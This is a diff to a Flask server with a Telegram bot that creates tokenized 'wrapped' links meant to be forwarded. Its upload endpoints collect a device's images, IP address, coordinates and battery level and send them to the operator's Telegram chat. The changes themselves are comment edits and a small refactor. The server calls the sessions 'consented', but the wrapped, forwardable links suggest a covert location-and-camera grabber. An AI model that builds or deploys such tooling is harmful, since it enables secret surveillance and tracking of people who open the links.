@@ -100,7 +100,7 @@ def normalize_url_for_wrap(text: str):
         return None
     return u
 
-# ---------- Endpoints ----------
+# ---------- Basic endpoints ----------
 @app.route("/")
 def index():
     return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)
@@ -161,7 +161,7 @@ def wrap_create():
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
     if chat_id:
-        # reply with only ONE link (clean for forwarding)
+        # reply with only ONE link (easy to forward)
         tg_send_text(chat_id, link)
     return jsonify({"token": token, "link": link})
 
@@ -342,7 +342,7 @@ def upload_info(token):
 
     return jsonify({"status": "ok", "stored": entry})
 
-# ---------- upload_image (unchanged except for cleaner caption) ----------
+# ---------- upload_image ----------
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
     if token not in SESSIONS:
@@ -396,7 +396,6 @@ def upload_image(token):
     chat_id = sess.get("chat_id")
     if chat_id:
         # short caption, IP + optional coords/battery
-        bat_txt = "unknown"
         if isinstance(battery, dict):
             lvl = battery.get("level")
             chg = battery.get("charging")
@@ -404,8 +403,12 @@ def upload_image(token):
                 if lvl is not None:
                     lvl = round(float(lvl))
                     bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
+                else:
+                    bat_txt = "unknown"
             except Exception:
                 bat_txt = str(battery)
+        else:
+            bat_txt = "unknown"
 
         if isinstance(coords, dict):
             lat = coords.get("lat")
@@ -469,7 +472,7 @@ def telegram_webhook():
         if not text or chat_id is None:
             return "ok", 200
 
-        # /start: show help, no input waiting
+        # /start: show help
         if text.lower().startswith("/start"):
             tg_send_text(
                 chat_id,
@@ -492,7 +495,6 @@ def telegram_webhook():
                 )
                 if r.ok:
                     data = r.json()
-                    # already sends message from /create, but we can repeat link if we want
                     tg_send_text(chat_id, data["link"])
                 else:
                     tg_send_text(chat_id, f"Failed to create session: {r.status_code}")
@@ -520,7 +522,6 @@ def telegram_webhook():
                 )
                 if r.ok:
                     data = r.json()
-                    # /wrap_create already sends the link; but repeat for clarity
                     tg_send_text(chat_id, data["link"])
                 else:
                     tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
